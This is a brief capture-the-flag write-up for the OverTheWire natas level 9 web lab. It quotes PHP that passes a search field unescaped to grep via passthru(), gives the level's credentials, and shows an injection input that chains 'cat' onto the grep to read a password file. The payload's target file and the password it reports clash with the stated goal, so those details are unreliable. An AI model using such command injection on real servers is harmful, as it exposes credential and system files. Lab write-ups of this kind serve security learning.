# natas level9
natas is CTF with web application.
password will be written `/etc/natas_webpass/natas9`.

## using credential is below.
- User:natas9
- Pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## using tools.
- shell(curl, base64, etc)
- lynx
check web site by lynx.
`lynx http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org`


followings is message of this page.
~~~
Find words containing: _ Search
Output:
~~~

If we put "f" in textarea and click Search, many words are returned(ex Africa, Food, etc).
And I get source code of this page, we found followings.
~~~
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
   $key = $_REQUEST["needle"];
}
if($key != "") {
   passthru("grep -i $key dictionary.txt");
}
~~~

This application use grep command by passthru. this is os command and this is not escaping.
Maybe I can use os command injection.

I input followings, and got password!
`unexistingfile.xyz || cat /etc/natas_webpass/natas9 `

W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

